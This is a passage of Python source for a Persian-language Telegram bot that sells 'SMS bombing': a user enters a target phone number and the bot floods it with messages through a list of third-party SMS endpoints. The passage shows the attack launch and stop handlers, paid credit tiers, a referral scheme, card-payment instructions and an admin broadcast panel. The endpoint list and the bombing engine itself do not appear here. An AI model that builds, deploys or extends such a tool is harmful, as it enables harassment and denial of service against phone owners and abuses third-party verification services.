    if len(args) > 1 and args[1].startswith('ref_'):
        code = args[1][4:]
        for uid, u in db.users.items():
            if u.get('referral_code') == code and uid != user_id:
                referred_by = uid
                break
    
    user = await db.get_user(user_id)
    if not user:
        user = await db.create_user(user_id, username, first_name, None, referred_by)
        if referred_by:
            await message.answer("🎉 با کد معرف ثبت‌نام کردی! به دوستت ۱ اعتبار اضافه شد.")
    
    await message.answer(
        f"👋 **سلام {first_name}!**\n\n"
        f"⭐ سطح: {user['tier']}\n"
        f"💰 اعتبار: {user['credits']}\n"
        f"📱 معرفی‌ها: {user['referral_count']}\n\n"
        f"از منوی زیر استفاده کن:",
        reply_markup=await main_keyboard(user_id)
    )

@dp.message(Command("ping"))
async def cmd_ping(message: Message):
    await message.answer("🏓 Pong! ربات فعال است!")

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    if bomber.is_running:
        bomber.stop()
        await message.answer("⏹️ حمله متوقف شد!")
    else:
        await message.answer("⚠️ هیچ حمله‌ای در حال اجرا نیست!")

@dp.callback_query(F.data == "sms_bomb")
async def sms_bomb(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    credits = await db.get_credits(user_id)
    tier = await db.get_tier(user_id)
    
    if credits <= 0:
        await callback.message.edit_text(
            "❌ **اعتبارت تموم شده!**\n\n"
            f"💰 اعتبار فعلی: {credits}\n"
            "برای خرید اعتبار از دکمه زیر استفاده کن:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 خرید اعتبار", callback_data="buy_credits")],
                [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
            ])
        )
        await callback.answer()
        return
    
    can_bomb, remaining, msg = await db.check_cooldown(user_id)
    if not can_bomb:
        await callback.message.edit_text(
            f"⏳ {msg}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
            ])
        )
        await callback.answer()
        return
    
    endpoints_count = len(SITES)
    if tier == 'Free':
        endpoints_count = min(endpoints_count, 30)
    elif tier == 'VIP':
        endpoints_count = min(endpoints_count, 80)
    
    await callback.message.edit_text(
        f"📱 **SMS Bomber**\n\n"
        f"📱 شماره هدف رو وارد کن:\n"
        f"مثال: `09123456789`\n\n"
        f"💰 اعتبار: {credits}\n"
        f"⭐ سطح: {tier}\n"
        f"📊 اندپوینت‌ها: {endpoints_count}\n\n"
        f"⚠️ هر حمله **۱ اعتبار** مصرف می‌کنه.\n"
        f"برای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
        ])
    )
    await state.set_state(BombState.waiting_for_phone)
    await callback.answer()

@dp.message(BombState.waiting_for_phone)
async def handle_phone(message: Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    if not phone.isdigit() or len(phone) < 10:
        await message.reply_text("❌ شماره نامعتبر! لطفاً یک شماره ۱۰ رقمی وارد کن.")
        return
    
    if phone.startswith('0'):
        phone = phone[1:]
    
    credits = await db.get_credits(user_id)
    if credits <= 0:
        await message.reply_text("❌ اعتبارت تموم شده!")
        await state.clear()
        return
    
    can_bomb, remaining, msg = await db.check_cooldown(user_id)
    if not can_bomb:
        await message.reply_text(f"⏳ {msg}")
        await state.clear()
        return
    
    tier = await db.get_tier(user_id)
    endpoints = SITES.copy()
    if tier == 'Free':
        endpoints = endpoints[:30]
    elif tier == 'VIP':
        endpoints = endpoints[:80]
    
    if not endpoints:
        await message.reply_text("❌ هیچ اندپوینتی در دسترس نیست!")
        await state.clear()
        return
    
    if not await db.spend_credit(user_id, 1):
        await message.reply_text("❌ خطا در کسر اعتبار!")
        await state.clear()
        return
    
    status_msg = await message.reply_text(
        f"🚀 **شروع حمله به {phone}...**\n"
        f"📊 تعداد اندپوینت: {len(endpoints)}\n"
        f"⭐ سطح: {tier}\n"
        f"⏳ لطفاً صبر کن...\n"
        f"⚠️ برای توقف /stop"
    )
    
    await db.update_last_bomb_time(user_id)
    
    def on_complete(result):
        asyncio.create_task(send_result(message, result, phone, status_msg, user_id))
    
    bomber.run_bomb(endpoints, phone, mode="storm", on_complete=on_complete)
    await state.clear()

async def send_result(message: Message, result: dict, phone: str, status_msg: Message, user_id: int):
    new_credits = await db.get_credits(user_id)
    await db.log_bomb(user_id, phone, result['success'], result['failed'] + result['errors'])
    
    msg = f"""
✅ **حمله به {phone} کامل شد!**

📊 **نتایج:**
• مجموع: {result['total']}
• ✅ موفق: {result['success']}
• ❌ ناموفق: {result['failed']}
• ⚠️ خطا: {result['errors']}

💰 اعتبار باقی‌مونده: {new_credits}
    """
    await status_msg.edit_text(msg, reply_markup=await main_keyboard(user_id))

@dp.callback_query(F.data == "profile")
async def show_profile(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = await db.get_user(user_id)
    stats = await db.get_stats(user_id)
    
    tier_emojis = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}
    
    await callback.message.edit_text(
        f"👤 **پروفایل شما**\n\n"
        f"🆔 شناسه: `{user_id}`\n"
        f"👤 نام: {user.get('first_name', '')}\n"
        f"⭐ سطح: {tier_emojis.get(user['tier'], '🆓')} {user['tier']}\n"
        f"💰 اعتبار: {user['credits']}\n"
        f"📱 معرفی‌ها: {user['referral_count']}\n"
        f"📊 کل بمب‌ها: {stats['total_bombs']}\n"
        f"✅ موفق: {stats['total_success']}\n"
        f"❌ ناموفق: {stats['total_failed']}\n"
        f"📅 ثبت‌نام: {user['registered_at'][:10]}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "referral")
async def show_referral(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = await db.get_user(user_id)
    code = user.get('referral_code', '')
    count = user.get('referral_count', 0)
    
    progress = min(count, 3)
    bar = "█" * progress + "░" * (3 - progress)
    
    await callback.message.edit_text(
        f"🔗 **سیستم معرفی**\n\n"
        f"📱 لینک معرفی تو:\n"
        f"`https://t.me/SMSBOMBER_free1_bot?start=ref_{code}`\n\n"
        f"📊 تعداد معرفی‌ها: {count}\n"
        f"⭐ پیشرفت به VIP: [{bar}] {progress}/3\n\n"
        f"💡 با معرفی ۳ کاربر به **VIP** ارتقا پیدا می‌کنی!\n"
        f"✨ مزایای VIP:\n"
        f"• ۸۰ اندپوینت\n"
        f"• ۳ دقیقه زمان انتظار",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "buy_credits")
async def buy_credits(callback: CallbackQuery):
    keyboard = [
        [InlineKeyboardButton(text="📦 ۵۰ بمب - ۲۰,۰۰۰ تومان", callback_data="buy_50")],
        [InlineKeyboardButton(text="📦 ۱۵۰ بمب - ۵۰,۰۰۰ تومان", callback_data="buy_150")],
        [InlineKeyboardButton(text="📦 ۵۰۰ بمب - ۱۵۰,۰۰۰ تومان", callback_data="buy_500")],
        [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
    ]
    
    await callback.message.edit_text(
        "💰 **خرید اعتبار**\n\n"
        "بسته مورد نظرت رو انتخاب کن:\n\n"
        "💳 شماره کارت: `6037-9918-1234-5678`\n"
        "👤 به نام: `حسین محمدی`\n\n"
        "📌 بعد از واریز، اسکرین‌شات رو به ادمین بفرست.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("buy_"))
async def buy_package(callback: CallbackQuery):
    package = callback.data.replace("buy_", "")
    packages = {
        '50': {'amount': 50, 'price': 20000},
        '150': {'amount': 150, 'price': 50000},
        '500': {'amount': 500, 'price': 150000}
    }
    pkg = packages.get(package, {'amount': 50, 'price': 20000})
    
    await callback.message.edit_text(
        f"📦 **بسته {pkg['amount']} بمب**\n\n"
        f"💰 مبلغ: {pkg['price']:,} تومان\n"
        f"📱 اعتبار: {pkg['amount']} بمب\n\n"
        f"💳 شماره کارت: `6037-9918-1234-5678`\n"
        f"👤 به نام: `حسین محمدی`\n\n"
        f"📸 بعد از واریز، اسکرین‌شات رو به ادمین بفرست.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="buy_credits")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "stats")
async def show_stats(callback: CallbackQuery):
    user_id = callback.from_user.id
    stats = await db.get_stats(user_id)
    
    await callback.message.edit_text(
        f"📊 **آمار تو**\n\n"
        f"⭐ سطح: {stats['tier']}\n"
        f"💰 اعتبار: {stats['credits']}\n"
        f"📱 معرفی‌ها: {stats['referral_count']}\n"
        f"📱 کل بمب‌ها: {stats['total_bombs']}\n"
        f"✅ موفق: {stats['total_success']}\n"
        f"❌ ناموفق: {stats['total_failed']}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "back")
async def go_back(callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.message.edit_text(
        "🏠 **منوی اصلی**",
        reply_markup=await main_keyboard(user_id)
    )
    await callback.answer()

# ============================================================
# پنل مدیریت
# ============================================================

@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in ADMIN_IDS:
        await callback.answer("❌ شما دسترسی ادمین نداری!")
        return
    
    keyboard = [
        [InlineKeyboardButton(text="👥 لیست کاربران", callback_data="admin_users")],
        [InlineKeyboardButton(text="📊 آمار کلی", callback_data="admin_stats_all")],
        [InlineKeyboardButton(text="📢 پیام همگانی", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
    ]
    
    await callback.message.edit_text(
        "⚙️ **پنل مدیریت**\n\n"
        "یک گزینه رو انتخاب کن:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in ADMIN_IDS:
        await callback.answer("❌ شما دسترسی ادمین نداری!")
        return
    
    if not db.users:
        await callback.message.edit_text(
            "📋 هیچ کاربری وجود نداره!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
            ])
        )
        await callback.answer()
        return
    
    msg = "👥 **لیست کاربران:**\n\n"
    for uid, u in list(db.users.items())[:10]:
        status = "🚫" if u.get('is_banned') else "✅"
        msg += f"{status} 🆔 `{uid}` | {u['tier']} | 💰{u['credits']}\n"
    
    await callback.message.edit_text(
        msg,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_stats_all")
async def admin_stats_all(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in ADMIN_IDS:
        await callback.answer("❌ شما دسترسی ادمین نداری!")
        return
    
    total = len(db.users)
    free = sum(1 for u in db.users.values() if u.get('tier') == 'Free')
    vip = sum(1 for u in db.users.values() if u.get('tier') == 'VIP')
    pro = sum(1 for u in db.users.values() if u.get('tier') == 'Pro')
    
    await callback.message.edit_text(
        f"📊 **آمار کلی ربات**\n\n"
        f"👥 کل کاربران: {total}\n"
        f"🆓 رایگان: {free}\n"
        f"⭐ VIP: {vip}\n"
        f"💎 Pro: {pro}\n"
        f"📱 کل بمب‌ها: {len(db.bomb_logs)}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if user_id not in ADMIN_IDS:
        await callback.answer("❌ شما دسترسی ادمین نداری!")
        return
    
    await callback.message.edit_text(
        "📢 **ارسال پیام همگانی**\n\n"
        "متن پیام رو وارد کن:\n"
        "برای لغو /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
        ])
    )
    await state.set_state(AdminState.waiting_for_broadcast)
    await callback.answer()

@dp.message(AdminState.waiting_for_broadcast)
async def handle_broadcast(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        await message.reply_text("❌ شما دسترسی ادمین نداری!")
        await state.clear()
        return
    
    text = message.text
    sent = 0
    failed = 0
    
    status = await message.reply_text(f"📢 در حال ارسال به {len(db.users)} کاربر...")
    
    for uid in db.users.keys():
        try:
            await message.bot.send_message(uid, f"📢 **پیام همگانی**\n\n{text}")
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.05)
    
    await status.edit_text(
        f"✅ **پیام ارسال شد!**\n\n"
        f"📤 ارسال شده: {sent}\n"
        f"❌ ناموفق: {failed}"
    )
    await state.clear()

# ============================================================
# اجرا
# ============================================================

async def main():
    print("""
╔══════════════════════════════════════════════╗
║     SMS BOMBER BOT - نسخه کامل              ║
║     با سیستم سطوح کاربری + اعتبار          ║
║     بیش از ۲۴۰ اندپوینت                    ║
╚══════════════════════════════════════════════╝
    """)
    print("🚀 ربات در حال راه‌اندازی...")
    print(f"📊 تعداد اندپوینت‌ها: {len(SITES)}")
    print(f"👑 ادمین‌ها: {ADMIN_IDS}")
    
    await bot.delete_webhook(drop_pending_updates=True)
    
    print("✅ ربات آماده است!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
